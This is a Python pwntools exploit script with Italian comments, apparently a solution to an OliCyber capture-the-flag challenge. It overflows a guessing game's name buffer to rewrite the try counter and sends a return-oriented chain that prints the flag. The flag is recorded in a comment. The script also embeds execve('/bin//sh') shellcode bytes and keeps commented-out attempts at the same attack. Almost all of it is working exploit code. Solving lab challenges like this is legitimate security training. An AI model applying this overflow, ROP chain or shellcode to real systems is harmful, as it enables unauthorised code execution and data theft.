#! /usr/bin/env python3
# gameInit
# prima funzione ad essere chiamata
# questa funzione restituisce un array molto bello

# 0. 4 byte, possiede il valore da beccare
# 0x4 - 0x1c spazio per il nome (forse finisce gi`a al 0x18 ma no sicuro)
# 0x1c - 0x20 4 byte per il numero di possibilit`all

# off set di 0x20 - 0x4 = 0x1c
# !!! posso overfloware il numero di possibilit`a.... 

from pwn import *
import struct

coso = ELF('./GuessTheNumber2')
# conn = process(coso.path)
conn = remote('gtn2.challs.olicyber.it', 10023)
printScores = coso.symbols['printScores']
gameSaveScore = coso.symbols['gameSaveScore']

# pop_rsi_and_other = 0x0000000000401801
# give_a_for_write = 0x00402101
# begin_write = 0x0040143e
pop_rdi = 0x0000000000401803
pop_rbp = 0x00000000004012bd
flag = 0x00404098 # 0x00007ffc906408e0
write_flag = 0x00401434
# legit_bp = p64(0x00404060) # fopen
# leave = p64(0x00401484)

# context.terminal = ['terminator', '-e']
# gdb.attach(conn, gdbscript= """
# 	b *0x00401796	
# 	c
# """)

shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# shell += b'AAA'
basePointer= 0x00401700
shell += struct.pack("I",basePointer)

g = cyclic_gen()
conn.recvuntil('scores:\n')

# region tentativi di scrivere flag
# provo a scrivere la flag, cosi ha la virgola
# ropchain = p64(gameSaveScore)

# ropchain = p64(pop_rsi_and_other)
# ropchain += p64(give_a_for_write)
# ropchain += b'\x00'*8 # fill a useless register
# ropchain += p64(pop_rdi)
# ropchain += p64(flag)
# ropchain += legit_bp # utilizzo la rbp che manda a fopen con questi valori
# ropchain += p64(begin_write)
# read flag
# endregion

ropchain = p64(0x000000000040101a) # ret
ropchain += p64(pop_rdi)
ropchain += p64(flag)
ropchain += p64(printScores)

print(ropchain)


conn.sendline(g.get(20) + b'\xff'*4 + g.get(12) + ropchain)
conn.recvuntil('dary file\n')
conn.sendline('1')

conn.interactive()
# flag{i11_g0_wh3r3v3r_y0u_w4n7}
# region binary search, but could be bypassed
# conn.sendline('1')
# conn.recvuntil('Try to guess it!\n')
# upper = 10000000000
# lower = -10000000000
# # binary search per trovare il numero giusto
# while True:
# 	valoreMedio = (upper + lower)//2
# 	conn.sendline(str(valoreMedio))

# 	# conn.interactive()
# 	res = conn.recvline()
# 	if lower > upper:
# 		print(" strano bug, fuck ")
# 		break
# 	# ce un piccolo bug nel caso in cui upper - lower = 1 ma spero che non accada spesso
# 	if res == b'Try lower ;)\n':
# 		upper = valoreMedio
# 	elif res == b'Try higher ;)\n':
# 		lower = valoreMedio
# 	else:
# 		print(res, "trovato?")
# 		conn.interactive()
# 		break
# endregion
